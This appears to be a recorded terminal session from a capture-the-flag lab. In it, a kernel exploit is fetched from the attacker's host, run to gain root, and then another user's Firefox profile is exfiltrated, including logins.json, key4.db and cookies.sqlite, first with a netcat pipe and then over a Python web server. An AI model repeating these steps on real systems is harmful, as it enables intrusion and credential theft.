@@ -1,0 +1,418 @@
+Script started on 2025-02-17 19:16:15+03:00 [COMMAND="ssh -i beth.key beth@london.bridge.thm" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Mon Feb 17 08:13:00 2025 from 10.8.61.245
+]0;beth@london: ~[01;32mbeth@london[00m:[01;34m~[00m$ uname -a
+Linux london 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+]0;beth@london: ~[01;32mbeth@london[00m:[01;34m~[00m$ cd /tmp
+]0;beth@london: /tmp[01;32mbeth@london[00m:[01;34m/tmp[00m$ ls
+[0m[01;34msystemd-private-727f893228b345f093956e90c160eaab-systemd-resolved.service-YilVm0[0m   [30;42mVMwareDnD[0m
+[01;34msystemd-private-727f893228b345f093956e90c160eaab-systemd-timesyncd.service-yWO5Pv[0m
+]0;beth@london: /tmp[01;32mbeth@london[00m:[01;34m/tmp[00m$ wget -t[Kr http://10.8.61.245/ZDI-24-020
+--2025-02-17 08:20:48--  http://10.8.61.245/ZDI-24-020
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 404 File not found
+2025-02-17 08:20:49 ERROR 404: File not found.
+
+]0;beth@london: /tmp[01;32mbeth@london[00m:[01;34m/tmp[00m$ wget -r http://10.8.61.245/ZDI-24-020
+--2025-02-17 08:21:30--  http://10.8.61.245/ZDI-24-020
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 301 Moved Permanently
+Location: /ZDI-24-020/ [following]
+--2025-02-17 08:21:31--  http://10.8.61.245/ZDI-24-020/
+Reusing existing connection to 10.8.61.245:80.
+HTTP request sent, awaiting response... No data received.
+Retrying.
+
+--2025-02-17 08:21:32--  (try: 2)  http://10.8.61.245/ZDI-24-020/
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 412 [text/html]
+Saving to: ‘10.8.61.245/ZDI-24-020’
+
+10.8.61.245/ZDI-24-020      0%[                                      ]       0  --.-KB/s               10.8.61.245/ZDI-24-020    100%[=====================================>]     412  --.-KB/s    in 0.007s  
+
+2025-02-17 08:21:32 (57.8 KB/s) - ‘10.8.61.245/ZDI-24-020’ saved [412/412]
+
+Loading robots.txt; please ignore errors.
+--2025-02-17 08:21:32--  http://10.8.61.245/robots.txt
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 404 File not found
+2025-02-17 08:21:33 ERROR 404: File not found.
+
+--2025-02-17 08:21:33--  http://10.8.61.245/ZDI-24-020/.git/
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 644 [text/html]
+10.8.61.245/ZDI-24-020/.git: Not a directory
+10.8.61.245/ZDI-24-020/.git/index.html: Not a directory
+
+Cannot write to ‘10.8.61.245/ZDI-24-020/.git/index.html’ (Not a directory).
+--2025-02-17 08:21:34--  http://10.8.61.245/ZDI-24-020/exploit.c
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 36482 (36K) [text/x-csrc]
+Saving to: ‘10.8.61.245/ZDI-24-020/exploit.c’
+
+             10.8.61.245/   0%[                                      ]       0  --.-KB/s                           10.8.61.245/Z  25%[========>                             ]   8.98K  20.9KB/s                          10.8.61.245/ZD  45%[================>                     ]  16.38K  22.3KB/s                         10.8.61.245/ZDI  85%[===============================>      ]  30.62K  27.9KB/s               10.8.61.245/ZDI-24-020/ex 100%[=====================================>]  35.63K  32.3KB/s    in 1.1s    
+
+2025-02-17 08:21:36 (32.3 KB/s) - ‘10.8.61.245/ZDI-24-020/exploit.c’ saved [36482/36482]
+
+--2025-02-17 08:21:36--  http://10.8.61.245/ZDI-24-020/Makefile
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 70 [application/octet-stream]
+Saving to: ‘10.8.61.245/ZDI-24-020/Makefile’
+
+             10.8.61.245/   0%[                                      ]       0  --.-KB/s               10.8.61.245/ZDI-24-020/Ma 100%[=====================================>]      70  --.-KB/s    in 0s      
+
+2025-02-17 08:21:37 (8.77 MB/s) - ‘10.8.61.245/ZDI-24-020/Makefile’ saved [70/70]
+
+--2025-02-17 08:21:37--  http://10.8.61.245/ZDI-24-020/README.md
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 8977 (8.8K) [text/markdown]
+Saving to: ‘10.8.61.245/ZDI-24-020/README.md’
+
+             10.8.61.245/   0%[                                      ]       0  --.-KB/s               10.8.61.245/ZDI-24-020/RE 100%[=====================================>]   8.77K  --.-KB/s    in 0.02s   
+
+2025-02-17 08:21:38 (372 KB/s) - ‘10.8.61.245/ZDI-24-020/README.md’ saved [8977/8977]
+
+--2025-02-17 08:21:38--  http://10.8.61.245/ZDI-24-020/symbols/
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 562 [text/html]
+Saving to: ‘10.8.61.245/ZDI-24-020/symbols/index.html’
+
+             10.8.61.245/   0%[                                      ]       0  --.-KB/s               10.8.61.245/ZDI-24-020/sy 100%[=====================================>]     562  --.-KB/s    in 0.01s   
+
+2025-02-17 08:21:38 (40.0 KB/s) - ‘10.8.61.245/ZDI-24-020/symbols/index.html’ saved [562/562]
+
+--2025-02-17 08:21:38--  http://10.8.61.245/ZDI-24-020/symbols/download_pkgs_rhel.py
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 596 [text/x-python]
+Saving to: ‘10.8.61.245/ZDI-24-020/symbols/download_pkgs_rhel.py’
+
+             10.8.61.245/   0%[                                      ]       0  --.-KB/s               10.8.61.245/ZDI-24-020/sy 100%[=====================================>]     596  --.-KB/s    in 0.007s  
+
+2025-02-17 08:21:39 (88.1 KB/s) - ‘10.8.61.245/ZDI-24-020/symbols/download_pkgs_rhel.py’ saved [596/596]
+
+--2025-02-17 08:21:39--  http://10.8.61.245/ZDI-24-020/symbols/download_pkgs_ubuntu_centos.py
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1213 (1.2K) [text/x-python]
+Saving to: ‘10.8.61.245/ZDI-24-020/symbols/download_pkgs_ubuntu_centos.py’
+
+             10.8.61.245/   0%[                                      ]       0  --.-KB/s               10.8.61.245/ZDI-24-020/sy 100%[=====================================>]   1.18K  --.-KB/s    in 0.02s   
+
+2025-02-17 08:21:40 (71.3 KB/s) - ‘10.8.61.245/ZDI-24-020/symbols/download_pkgs_ubuntu_centos.py’ saved [1213/1213]
+
+--2025-02-17 08:21:40--  http://10.8.61.245/ZDI-24-020/symbols/extract_syms_redhat.py
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1269 (1.2K) [text/x-python]
+Saving to: ‘10.8.61.245/ZDI-24-020/symbols/extract_syms_redhat.py’
+
+             10.8.61.245/   0%[                                      ]       0  --.-KB/s               10.8.61.245/ZDI-24-020/sy 100%[=====================================>]   1.24K  --.-KB/s    in 0s      
+
+2025-02-17 08:21:40 (146 MB/s) - ‘10.8.61.245/ZDI-24-020/symbols/extract_syms_redhat.py’ saved [1269/1269]
+
+--2025-02-17 08:21:40--  http://10.8.61.245/ZDI-24-020/symbols/extract_syms_ubuntu.py
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3771 (3.7K) [text/x-python]
+Saving to: ‘10.8.61.245/ZDI-24-020/symbols/extract_syms_ubuntu.py’
+
+             10.8.61.245/   0%[                                      ]       0  --.-KB/s               10.8.61.245/ZDI-24-020/sy 100%[=====================================>]   3.68K  --.-KB/s    in 0s      
+
+2025-02-17 08:21:41 (279 MB/s) - ‘10.8.61.245/ZDI-24-020/symbols/extract_syms_ubuntu.py’ saved [3771/3771]
+
+--2025-02-17 08:21:41--  http://10.8.61.245/ZDI-24-020/symbols/kallsyms.py
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 632 [text/x-python]
+Saving to: ‘10.8.61.245/ZDI-24-020/symbols/kallsyms.py’
+
+             10.8.61.245/   0%[                                      ]       0  --.-KB/s               10.8.61.245/ZDI-24-020/sy 100%[=====================================>]     632  --.-KB/s    in 0s      
+
+2025-02-17 08:21:42 (84.8 MB/s) - ‘10.8.61.245/ZDI-24-020/symbols/kallsyms.py’ saved [632/632]
+
+FINISHED --2025-02-17 08:21:42--
+Total wall clock time: 12s
+Downloaded: 10 files, 53K in 1.2s (45.0 KB/s)
+]0;beth@london: /tmp[01;32mbeth@london[00m:[01;34m/tmp[00m$ ls
+[0m[01;34m10.8.61.245[0m
+[01;34msystemd-private-727f893228b345f093956e90c160eaab-systemd-resolved.service-YilVm0[0m
+[01;34msystemd-private-727f893228b345f093956e90c160eaab-systemd-timesyncd.service-yWO5Pv[0m
+[30;42mVMwareDnD[0m
+]0;beth@london: /tmp[01;32mbeth@london[00m:[01;34m/tmp[00m$ mv 10.8.61.245/ [K[K ZDI-24-020
+]0;beth@london: /tmp[01;32mbeth@london[00m:[01;34m/tmp[00m$ xc[K[Kcd ZDI-24-020/
+]0;beth@london: /tmp/ZDI-24-020[01;32mbeth@london[00m:[01;34m/tmp/ZDI-24-020[00m$ ls
+[0m[01;34mZDI-24-020[0m
+]0;beth@london: /tmp/ZDI-24-020[01;32mbeth@london[00m:[01;34m/tmp/ZDI-24-020[00m$ cd[K[Kcd ..
+]0;beth@london: /tmp[01;32mbeth@london[00m:[01;34m/tmp[00m$ mv ZDI-24-020/ prio[Kvesc
+]0;beth@london: /tmp[01;32mbeth@london[00m:[01;34m/tmp[00m$ cd privesc
+]0;beth@london: /tmp/privesc[01;32mbeth@london[00m:[01;34m/tmp/privesc[00m$ ls
+[0m[01;34mZDI-24-020[0m
+]0;beth@london: /tmp/privesc[01;32mbeth@london[00m:[01;34m/tmp/privesc[00m$ cd ZDI-24-020/
+]0;beth@london: /tmp/privesc/ZDI-24-020[01;32mbeth@london[00m:[01;34m/tmp/privesc/ZDI-24-020[00m$ ls
+exploit.c  Makefile  README.md  [0m[01;34msymbols[0m
+]0;beth@london: /tmp/privesc/ZDI-24-020[01;32mbeth@london[00m:[01;34m/tmp/privesc/ZDI-24-020[00m$ make
+gcc exploit.c -o exploit -lpthread -Wall
+]0;beth@london: /tmp/privesc/ZDI-24-020[01;32mbeth@london[00m:[01;34m/tmp/privesc/ZDI-24-020[00m$ ./exploit
+USAGE: ./exploit <rhel|centos|ubuntu>
+]0;beth@london: /tmp/privesc/ZDI-24-020[01;32mbeth@london[00m:[01;34m/tmp/privesc/ZDI-24-020[00m$ ./exploit[K[K[K[K[K[K[K[K[Kuname -a
+Linux london 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+]0;beth@london: /tmp/privesc/ZDI-24-020[01;32mbeth@london[00m:[01;34m/tmp/privesc/ZDI-24-020[00m$ ./exploit ubuntu
+[+] Attempt 1/10
+[+] Found kernel '4.15.0-112-generic' [run_cmd]
+[+] Found kernel .text, 0xffffffffa2400000
+[!] need at least 3 cores ideally, found 2
+[i] UAF seems to have missed :(
+[i] Payload failed to run
+[+] Attempt 2/10
+[+] Found kernel '4.15.0-112-generic' [run_cmd]
+[+] Found kernel .text, 0xffffffffa2400000
+[!] need at least 3 cores ideally, found 2
+[+] UAF seems to have hit
+[+] Payload ran correctly, spawning shell
+uid=0(root) gid=0(root) groups=0(root),1000(beth)
+bash-4.4# id
+uid=0(root) gid=0(root) groups=0(root),1000(beth)
+bash-4.4# ls
+exploit  exploit.c  Makefile  README.md  symbols
+bash-4.4# cd /root
+bash-4.4# ls -al
+total 52
+drwx------  6 root root 4096 Apr 23  2024 .
+drwxr-xr-x 23 root root 4096 Apr  7  2024 ..
+lrwxrwxrwx  1 root root    9 Sep 18  2023 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  3 root root 4096 Apr 23  2024 .cache
+-rw-r--r--  1 beth beth 2246 Mar 16  2024 flag.py
+-rw-r--r--  1 beth beth 2481 Mar 16  2024 flag.pyc
+drwx------  3 root root 4096 Apr 23  2024 .gnupg
+drwxr-xr-x  3 root root 4096 Sep 16  2023 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwxr-xr-x  2 root root 4096 Mar 16  2024 __pycache__
+-rw-rw-r--  1 root root   27 Sep 18  2023 .root.txt
+-rw-r--r--  1 root root   66 Mar 10  2024 .selected_editor
+-rw-r--r--  1 beth beth  175 Mar 16  2024 test.py
+bash-4.4# cat .root.txt
+THM{l0nd0n_br1d63_p47ch3d}
+bash-4.4# cd /home
+bash-4.4# ls
+beth  charles
+bash-4.4# cd charles
+bash-4.4# ls -al
+total 24
+drw------- 3 charles charles 4096 Apr 23  2024 .
+drwxr-xr-x 4 root    root    4096 Mar 10  2024 ..
+lrwxrwxrwx 1 root    root       9 Apr 23  2024 .bash_history -> /dev/null
+-rw------- 1 charles charles  220 Mar 10  2024 .bash_logout
+-rw------- 1 charles charles 3771 Mar 10  2024 .bashrc
+drw------- 3 charles charles 4096 Mar 16  2024 .mozilla
+-rw------- 1 charles charles  807 Mar 10  2024 .profile
+bash-4.4# cd /root
+bash-4.4# ls -al
+total 52
+drwx------  6 root root 4096 Apr 23  2024 .
+drwxr-xr-x 23 root root 4096 Apr  7  2024 ..
+lrwxrwxrwx  1 root root    9 Sep 18  2023 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  3 root root 4096 Apr 23  2024 .cache
+-rw-r--r--  1 beth beth 2246 Mar 16  2024 flag.py
+-rw-r--r--  1 beth beth 2481 Mar 16  2024 flag.pyc
+drwx------  3 root root 4096 Apr 23  2024 .gnupg
+drwxr-xr-x  3 root root 4096 Sep 16  2023 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwxr-xr-x  2 root root 4096 Mar 16  2024 __pycache__
+-rw-rw-r--  1 root root   27 Sep 18  2023 .root.txt
+-rw-r--r--  1 root root   66 Mar 10  2024 .selected_editor
+-rw-r--r--  1 beth beth  175 Mar 16  2024 test.py
+bash-4.4# cd -
+/home/charles
+bash-4.4# ls -al
+total 24
+drw------- 3 charles charles 4096 Apr 23  2024 .
+drwxr-xr-x 4 root    root    4096 Mar 10  2024 ..
+lrwxrwxrwx 1 root    root       9 Apr 23  2024 .bash_history -> /dev/null
+-rw------- 1 charles charles  220 Mar 10  2024 .bash_logout
+-rw------- 1 charles charles 3771 Mar 10  2024 .bashrc
+drw------- 3 charles charles 4096 Mar 16  2024 .mozilla
+-rw------- 1 charles charles  807 Mar 10  2024 .profile
+bash-4.4# cd .mozila
+bash: cd: .mozila: No such file or directory
+bash-4.4# ls
+bash-4.4# cd .mozilla
+bash-4.4# ls
+firefox
+bash-4.4# c[Kls -al
+total 12
+drw------- 3 charles charles 4096 Mar 16  2024 .
+drw------- 3 charles charles 4096 Apr 23  2024 ..
+drw------- 3 charles charles 4096 Mar 16  2024 firefox
+bash-4.4# cd firefoxz[K
+bash-4.4# ls
+8k3bf3zp.charles
+bash-4.4# dd if=8k3bf3zp.charles d[Kstatus=progress | nc 10.8.61.245 4444
+dd: error reading '8k3bf3zp.charles': Is a directory
+0+0 records in
+0+0 records out
+0 bytes copied, 9.3421e-05 s, 0.0 kB/s
+bash-4.4# ls -al
+total 12
+drw-------  3 charles charles 4096 Mar 16  2024 .
+drw-------  3 charles charles 4096 Mar 16  2024 ..
+drw------- 16 charles beth    4096 Mar 16  2024 8k3bf3zp.charles
+bash-4.4# python [K3 -m http.server 6047
+Serving HTTP on 0.0.0.0 port 6047 (http://0.0.0.0:6047/) ...
+10.8.61.245 - - [17/Feb/2025 08:28:34] "GET /8k3bf3zp.charles HTTP/1.1" 301 -
+10.8.61.245 - - [17/Feb/2025 08:28:34] "GET /8k3bf3zp.charles/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:28:35] code 404, message File not found
+10.8.61.245 - - [17/Feb/2025 08:28:35] "GET /robots.txt HTTP/1.1" 404 -
+10.8.61.245 - - [17/Feb/2025 08:28:36] "GET /8k3bf3zp.charles/.parentlock HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:28:36] "GET /8k3bf3zp.charles/addons.json HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:28:37] "GET /8k3bf3zp.charles/addonStartup.json.lz4 HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:28:37] "GET /8k3bf3zp.charles/AlternateServices.txt HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:28:38] "GET /8k3bf3zp.charles/bookmarkbackups/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:28:39] "GET /8k3bf3zp.charles/broadcast-listeners.json HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:28:39] "GET /8k3bf3zp.charles/browser-extension-data/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:28:40] "GET /8k3bf3zp.charles/cache2/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:28:41] "GET /8k3bf3zp.charles/cert9.db HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:28:48] "GET /8k3bf3zp.charles/compatibility.ini HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:28:49] "GET /8k3bf3zp.charles/containers.json HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:28:49] "GET /8k3bf3zp.charles/content-prefs.sqlite HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:28:54] "GET /8k3bf3zp.charles/cookies.sqlite HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:29:10] "GET /8k3bf3zp.charles/crashes/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:29:11] "GET /8k3bf3zp.charles/datareporting/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:29:12] "GET /8k3bf3zp.charles/extension-preferences.json HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:29:12] "GET /8k3bf3zp.charles/extension-store/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:29:13] "GET /8k3bf3zp.charles/extensions.json HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:29:14] "GET /8k3bf3zp.charles/favicons.sqlite HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:32:10] "GET /8k3bf3zp.charles/formhistory.sqlite HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:32:23] "GET /8k3bf3zp.charles/gmp-gmpopenh264/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:32:25] "GET /8k3bf3zp.charles/handlers.json HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:32:25] "GET /8k3bf3zp.charles/key4.db HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:32:36] code 404, message File not found
+10.8.61.245 - - [17/Feb/2025 08:32:36] "GET /8k3bf3zp.charles/lock HTTP/1.1" 404 -
+10.8.61.245 - - [17/Feb/2025 08:32:36] "GET /8k3bf3zp.charles/logins-backup.json HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:32:37] "GET /8k3bf3zp.charles/logins.json HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:32:37] "GET /8k3bf3zp.charles/minidumps/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:32:38] "GET /8k3bf3zp.charles/permissions.sqlite HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:32:41] "GET /8k3bf3zp.charles/pkcs11.txt HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:32:41] "GET /8k3bf3zp.charles/places.sqlite HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:33:48] "GET /8k3bf3zp.charles/prefs.js HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:33:49] "GET /8k3bf3zp.charles/protections.sqlite HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:33:51] "GET /8k3bf3zp.charles/safebrowsing/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:33:51] "GET /8k3bf3zp.charles/search.json.mozlz4 HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:33:53] "GET /8k3bf3zp.charles/security_state/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:33:53] "GET /8k3bf3zp.charles/sessionCheckpoints.json HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:33:54] "GET /8k3bf3zp.charles/sessionstore-backups/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:33:55] "GET /8k3bf3zp.charles/sessionstore.jsonlz4 HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:33:55] "GET /8k3bf3zp.charles/settings/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:33:56] "GET /8k3bf3zp.charles/shield-preference-experiments.json HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:33:58] "GET /8k3bf3zp.charles/SiteSecurityServiceState.txt HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:34:00] "GET /8k3bf3zp.charles/startupCache/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:34:01] "GET /8k3bf3zp.charles/storage/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:34:02] "GET /8k3bf3zp.charles/storage-sync-v2.sqlite HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:34:03] "GET /8k3bf3zp.charles/storage-sync-v2.sqlite-shm HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:34:04] "GET /8k3bf3zp.charles/storage-sync-v2.sqlite-wal HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:34:10] "GET /8k3bf3zp.charles/storage.sqlite HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:34:10] "GET /8k3bf3zp.charles/times.json HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:34:11] "GET /8k3bf3zp.charles/webappsstore.sqlite HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:34:14] "GET /8k3bf3zp.charles/xulstore.json HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:34:14] "GET /8k3bf3zp.charles/browser-extension-data/amazondotcom%40search.mozilla.org/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:34:15] "GET /8k3bf3zp.charles/cache2/ce_T151c2VyQ29udGV4dElkPTUs HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:34:16] "GET /8k3bf3zp.charles/cache2/ce_T151c2VyQ29udGV4dElkPTUsYSw%3D HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:34:16] "GET /8k3bf3zp.charles/cache2/doomed/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:34:17] "GET /8k3bf3zp.charles/cache2/entries/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:34:18] "GET /8k3bf3zp.charles/crashes/events/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:34:18] "GET /8k3bf3zp.charles/crashes/store.json.mozlz4 HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:34:19] "GET /8k3bf3zp.charles/datareporting/glean/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:34:19] "GET /8k3bf3zp.charles/datareporting/session-state.json HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:34:20] "GET /8k3bf3zp.charles/datareporting/state.json HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:34:20] "GET /8k3bf3zp.charles/gmp-gmpopenh264/2.3.2/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:34:21] "GET /8k3bf3zp.charles/safebrowsing/google4/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:34:23] "GET /8k3bf3zp.charles/security_state/data.safe.bin HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:36:10] "GET /8k3bf3zp.charles/sessionstore-backups/previous.jsonlz4 HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:36:11] "GET /8k3bf3zp.charles/sessionstore-backups/upgrade.jsonlz4-20240115170312 HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:36:13] "GET /8k3bf3zp.charles/settings/data.safe.bin HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:36:14] "GET /8k3bf3zp.charles/settings/main/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:36:14] "GET /8k3bf3zp.charles/startupCache/scriptCache-child.bin HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:36:35] "GET /8k3bf3zp.charles/startupCache/scriptCache.bin HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:38:32] "GET /8k3bf3zp.charles/startupCache/startupCache.8.little HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:39:38] "GET /8k3bf3zp.charles/startupCache/urlCache.bin HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:39:39] "GET /8k3bf3zp.charles/startupCache/webext.sc.lz4 HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:39:41] "GET /8k3bf3zp.charles/storage/default/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:39:43] "GET /8k3bf3zp.charles/storage/ls-archive.sqlite HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:39:47] "GET /8k3bf3zp.charles/storage/permanent/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:39:49] "GET /8k3bf3zp.charles/storage/temporary/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:39:50] "GET /8k3bf3zp.charles/storage/to-be-removed/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:39:51] "GET /8k3bf3zp.charles/cache2/doomed/1258527757 HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:39:54] "GET /8k3bf3zp.charles/cache2/entries/254256B27E0C48CF9B80B695F0B3B8CA84610495 HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:39:56] "GET /8k3bf3zp.charles/cache2/entries/6D89348819C8881868053197CA0754F36784BF5F HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:39:57] "GET /8k3bf3zp.charles/cache2/entries/A72798DEF4F924983D5A0DB82D383C613B515FF2 HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:39:59] "GET /8k3bf3zp.charles/cache2/entries/BE575EF3FE0664E10C60DCFF276B3A09EA8A25F8 HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:40:02] "GET /8k3bf3zp.charles/cache2/entries/D0F48A0632B6C451791F4257697E861961F06A6F HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:40:06] "GET /8k3bf3zp.charles/cache2/entries/DED23BB33EA3C88FAD1C0A1CD53916E0D8C424D3 HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:40:12] "GET /8k3bf3zp.charles/cache2/entries/F8CBD54DDA10F4286A41EC6A537240712D6C2308 HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:40:14] "GET /8k3bf3zp.charles/datareporting/glean/db/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:40:15] "GET /8k3bf3zp.charles/datareporting/glean/events/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:40:16] "GET /8k3bf3zp.charles/datareporting/glean/pending_pings/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:40:17] "GET /8k3bf3zp.charles/gmp-gmpopenh264/2.3.2/gmpopenh264.info HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:40:18] "GET /8k3bf3zp.charles/gmp-gmpopenh264/2.3.2/libgmpopenh264.so HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:40:41] "GET /8k3bf3zp.charles/settings/main/ms-language-packs/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:40:42] "GET /8k3bf3zp.charles/storage/default/https%2B%2B%2Bwww.google.com/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:40:43] "GET /8k3bf3zp.charles/storage/permanent/chrome/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:40:44] "GET /8k3bf3zp.charles/datareporting/glean/db/data.safe.bin HTTP/1.1" 200 -
